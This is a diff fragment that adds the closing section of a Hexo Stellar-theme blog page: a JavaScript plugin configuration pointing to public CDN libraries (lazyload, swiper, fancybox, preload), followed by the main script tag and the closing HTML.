+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.css","js":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://gcore.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://gcore.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://gcore.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
